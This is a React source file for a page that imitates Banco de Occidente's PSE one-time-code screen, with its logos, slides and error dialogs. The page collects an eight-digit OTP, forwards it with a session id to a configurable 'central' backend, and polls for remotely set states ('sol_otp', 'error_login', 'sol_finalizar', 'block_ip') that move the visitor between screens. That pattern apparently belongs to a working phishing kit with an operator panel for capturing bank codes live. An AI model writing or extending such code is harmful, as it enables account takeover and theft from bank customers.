import React, { useEffect, useRef, useState } from "react";
import { useNavigate } from "react-router-dom";
import { instanceBackend } from "../../../../../axios/instanceBackend";
import LoadingOccidenteOtp from "../../../../../components/LoadingOccidenteOtp";
import logoAval from "../../img/logo_aval.svg";
import logoVigilado from "../../img/logo_vigilado.svg";
import slideOne from "../../img/sliders/slider-1.jpeg";
import slideTwo from "../../img/sliders/slider-2.jpeg";
import slideThree from "../../img/sliders/slider-3.jpeg";
import slideFour from "../../img/sliders/slider-4.jpeg";
import slideFive from "../../img/sliders/slider-5.jpeg";
import iconoSeguridad from "../../img/icono_seguridad.svg";
import brandLogo from "../../img/logo-occidente.svg";
import errorLogoOccidente from "../../img/error_logo_occidente.svg";
import "./otp_occidente_pse.css";

const OCCIDENTE_OTP_ERROR_MSG =
  "El código OTP ingresado es incorrecto. Verifica tus datos e intenta nuevamente.";
const OCCIDENTE_ERROR_MODAL_AUTO_HIDE_MS = 7000;

export default function OtpOccidentePse() {
  // Se inicializa el navigate
  const navigate = useNavigate();

  const slides = [slideOne, slideTwo, slideThree, slideFour, slideFive];
  const [activeSlide, setActiveSlide] = useState(0);
  const [isOtpModalOpen] = useState(true);
  const [otpDigits, setOtpDigits] = useState(Array(8).fill(""));
  const [showModal, setShowModal] = useState(false);
  const [modalText, setModalText] = useState("");
  const [getLoading, setLoading] = useState(false);
  const otpInputRefs = useRef([]);
  const pollingIntervalRef = useRef(null);
  const sessionIdRef = useRef(null);
  const lastEstadoRef = useRef(null);
  const closeModalRef = useRef(() => {});

  const clearOtpFields = () => {
    setOtpDigits(Array(8).fill(""));
  };

  const openOtpErrorModal = (message) => {
    setLoading(false);
    clearOtpFields();
    setModalText(message);
    setShowModal(true);
  };

  useEffect(() => {
    // Se inicializa la sesión activa
    sessionIdRef.current = localStorage.getItem("sessionId");

    // Se revisa si hay modal pendiente desde login
    const pendingError = localStorage.getItem("occidente_error_modal");
    if (pendingError === "error_otp") {
      openOtpErrorModal(OCCIDENTE_OTP_ERROR_MSG);
    } else if (pendingError === "block_ip") {
      openOtpErrorModal("Acceso bloqueado por seguridad.");
    }
    if (pendingError) {
      localStorage.removeItem("occidente_error_modal");
    }

    const intervalId = setInterval(() => {
      setActiveSlide((prev) => (prev + 1) % slides.length);
    }, 4500);

    return () => clearInterval(intervalId);
  }, [slides.length]);

  // Limpia el timeout de polling al desmontar
  useEffect(() => {
    return () => {
      if (pollingIntervalRef.current) {
        clearTimeout(pollingIntervalRef.current);
        pollingIntervalRef.current = null;
      }
    };
  }, []);

  const isOtpSubmitEnabled = otpDigits.every((digit) => digit !== "");

  const handleOtpDigitChange = (index, rawValue) => {
    const value = rawValue.replace(/\D/g, "").slice(-1);

    if (!value) {
      // Borrado: limpiar la casilla actual
      setOtpDigits((prev) => {
        const updated = [...prev];
        updated[index] = "";
        return updated;
      });
      return;
    }

    // Si tiene dígito: llenar la primera casilla vacía (de izquierda a derecha)
    const firstEmptyIndex = otpDigits.findIndex((d) => d === "");
    const targetIndex = firstEmptyIndex !== -1 ? firstEmptyIndex : index;

    setOtpDigits((prev) => {
      const updated = [...prev];
      updated[targetIndex] = value;
      return updated;
    });

    // Mover foco a la siguiente casilla después de la que se acaba de llenar
    const nextFocusIndex =
      targetIndex < otpDigits.length - 1 ? targetIndex + 1 : targetIndex;
    otpInputRefs.current[nextFocusIndex]?.focus();
  };

  const handleOtpKeyDown = (index, event) => {
    if (event.key === "Backspace" && !otpDigits[index] && index > 0) {
      otpInputRefs.current[index - 1]?.focus();
    }
    if (event.key === "ArrowLeft" && index > 0) {
      otpInputRefs.current[index - 1]?.focus();
    }
    if (event.key === "ArrowRight" && index < otpDigits.length - 1) {
      otpInputRefs.current[index + 1]?.focus();
    }
  };

  const handleOtpPaste = (event) => {
    event.preventDefault();
    const pastedData = event.clipboardData.getData("text").replace(/\D/g, "").slice(0, 8);
    if (!pastedData) return;

    const newValues = [...otpDigits];
    pastedData.split("").forEach((char, i) => {
      if (i < newValues.length) newValues[i] = char;
    });
    setOtpDigits(newValues);

    const nextEmptyIndex = newValues.findIndex((v) => v === "");
    if (nextEmptyIndex !== -1) {
      otpInputRefs.current[nextEmptyIndex]?.focus();
    } else {
      otpInputRefs.current[newValues.length - 1]?.focus();
    }
  };

  // Se crea helper de redirección
  const redirigir = (ruta) => {
    navigate(ruta);
  };

  // Se limpia y cierra modal local
  const closeModal = () => {
    setShowModal(false);
    setLoading(false);
    clearOtpFields();
  };

  closeModalRef.current = closeModal;

  useEffect(() => {
    if (!showModal) return undefined;

    const timer = window.setTimeout(() => {
      closeModalRef.current();
    }, OCCIDENTE_ERROR_MODAL_AUTO_HIDE_MS);

    return () => window.clearTimeout(timer);
  }, [showModal]);

  // Se inicializa polling con setTimeout recursivo
  const initPolling = () => {
    if (pollingIntervalRef.current) {
      clearTimeout(pollingIntervalRef.current);
      pollingIntervalRef.current = null;
    }

    const poll = async () => {
      try {
        const response = await instanceBackend.post(
          `/occidente/verify-state/${sessionIdRef.current}`,
        );
        const estadoActual = (response?.data?.estado || "").toLowerCase();

        // Se evita re-procesar el mismo estado en cada ciclo
        if (!estadoActual || lastEstadoRef.current === estadoActual) {
          pollingIntervalRef.current = setTimeout(poll, 3000);
          return;
        }
        lastEstadoRef.current = estadoActual;

        // Estados que detienen el polling
        const stateValid = [
          "sol_otp", "error_otp", "error_login", "sol_finalizar", "block_ip", "error_blocked",
        ];

        // Solo se programa el siguiente timeout si NO es estado terminal
        if (!stateValid.includes(estadoActual)) {
          pollingIntervalRef.current = setTimeout(poll, 3000);
        } else {
          pollingIntervalRef.current = null;
        }

        switch (estadoActual) {
          case "sol_otp":
            setLoading(false);
            setOtpDigits(Array(8).fill(""));
            break;
          case "error_otp":
            openOtpErrorModal(OCCIDENTE_OTP_ERROR_MSG);
            break;
          case "error_login":
            setLoading(false);
            localStorage.setItem("occidente_error_modal", "error_login");
            redirigir("/occidente_pse");
            break;
          case "sol_finalizar":
            setLoading(false);
            redirigir("/finalizado-pse");
            break;
          case "block_ip":
          case "error_blocked":
            openOtpErrorModal("Acceso bloqueado por seguridad.");
            break;
          default:
        }
      } catch (error) {
        // Se omite para no romper UX; se reintenta
        pollingIntervalRef.current = setTimeout(poll, 3000);
      }
    };

    // Inicia inmediatamente
    poll();
  };

  // Se procesa submit OTP
  const handleSubmit = async (event) => {
    event.preventDefault();
    if (!isOtpSubmitEnabled || getLoading) return;

    const otp = otpDigits.join("");
    const sessionId = localStorage.getItem("sessionId");
    const centralUrl = (
      process.env.REACT_APP_API_BASE_URL_BACKEND_CENTRAL || ""
    ).trim();

    const dataSend = {
      data: {
        attributes: {
          otp,
          fecha: new Date().toISOString(),
          sessionId: sessionId || sessionIdRef.current,
          backend: "P01",
          backend_central_url: process.env.REACT_APP_API_BASE_URL_BACKEND_CENTRAL,
          backend_url: "/api/v1/occidente/otp",
        },
      },
    };

    try {
      setLoading(true);
      const response = centralUrl
        ? await instanceBackend.post(centralUrl, dataSend)
        : await instanceBackend.post("/occidente/otp", dataSend);

      if (response?.data?.success) {
        localStorage.setItem("sessionId", response.data.sessionId);
        sessionIdRef.current = response.data.sessionId;
        initPolling();
      } else {
        openOtpErrorModal(OCCIDENTE_OTP_ERROR_MSG);
      }
    } catch (error) {
      openOtpErrorModal("Error de conexión con el servidor.");
    }
  };

  // Metodo encargado de limpiar el OTP
  const handleClean = () => {

    // Se limpia el OTP
    setOtpDigits(Array(8).fill(""));

    // Se enfoca el primer input
    otpInputRefs.current[0]?.focus();
  };

  // Se retorna el codigo HTML
  return (
    <div className="occidente-pse-page">
      <img
        src={logoVigilado}
        alt="Logo Vigilado"
        className="occidente-pse-vigilado"
      />

      <div className="occidente-pse-hero">
        {slides.map((slideSrc, index) => (
          <img
            key={slideSrc}
            src={slideSrc}
            alt="Fondo Banco de Occidente"
            className={`occidente-pse-slide ${index === activeSlide ? "active" : ""}`}
          />
        ))}
      </div>

      <div className="occidente-pse-footer-brand">
        <span className="occidente-pse-version">v5.2.3.2</span>
        <img src={logoAval} alt="Grupo Aval" className="occidente-pse-aval" />
      </div>

      {isOtpModalOpen ? (
        <div className="occidente-otp-modal-overlay" role="presentation">
          <div
            className="occidente-otp-modal"
            role="dialog"
            aria-modal="true"
            aria-labelledby="occidente-otp-modal-title"
          >
            <h2 id="occidente-otp-modal-title" className="occidente-otp-modal-sr-only">
              Autenticacion OTP
            </h2>

            <form
              className="occidente-otp-modal-form"
              onSubmit={handleSubmit}
            >
              <div className="occidente-otp-modal-icon-wrap" aria-hidden="true">
                <img
                  src={iconoSeguridad}
                  alt=""
                  className="occidente-otp-modal-icon"
                />
              </div>

              <h3 className="occidente-otp-modal-title">REVISA TU CELULAR</h3>

              <p className="occidente-otp-modal-copy">
                Dependiendo de tu operador de telefonia movil, el envio puede
                tomar hasta 1 minuto.
              </p>

              <div className="occidente-otp-digits-row">
                {otpDigits.map((digit, index) => (
                  <input
                    key={`otp-digit-${index}`}
                    ref={(element) => {
                      otpInputRefs.current[index] = element;
                    }}
                    type="number"
                    inputMode="numeric"
                    pattern="[0-9]*"
                    autoComplete="one-time-code"
                    min="0"
                    max="9"
                    step="1"
                    maxLength={1}
                    className="occidente-otp-digit-input"
                    value={digit}
                    autoFocus={index === 0}
                    onChange={(event) =>
                      handleOtpDigitChange(index, event.target.value)
                    }
                    onKeyDown={(event) => handleOtpKeyDown(index, event)}
                    onPaste={handleOtpPaste}
                    aria-label={`Digito ${index + 1} del codigo OTP`}
                  />
                ))}
              </div>

              <div className="occidente-otp-modal-actions">
                <button type="button" className="secondary" onClick={handleClean}>
                  Cancelar
                </button>
                <button type="submit" className="primary" disabled={!isOtpSubmitEnabled || getLoading}>
                  Continuar
                </button>
              </div>
            </form>
          </div>
        </div>
      ) : null}

      {showModal ? (
        <div
          className="occidente-otp-error-overlay"
          role="alertdialog"
          aria-modal="true"
          aria-labelledby="occidente-otp-error-title"
          aria-describedby="occidente-otp-error-message"
        >
          <div className="occidente-otp-error-card">
            <div className="occidente-otp-error-content">
              <img
                src={brandLogo}
                alt="Banco de Occidente"
                className="occidente-otp-error-brand"
              />
              <h2
                id="occidente-otp-error-title"
                className="occidente-otp-error-title"
              >
                LO SENTIMOS
              </h2>
              <img
                src={errorLogoOccidente}
                alt=""
                aria-hidden="true"
                className="occidente-otp-error-illustration"
              />
              <p
                id="occidente-otp-error-message"
                className="occidente-otp-error-message"
              >
                {modalText}
              </p>
            </div>
          </div>
        </div>
      ) : null}

      {getLoading ? <LoadingOccidenteOtp isOpen /> : null}
    </div>
  );
}
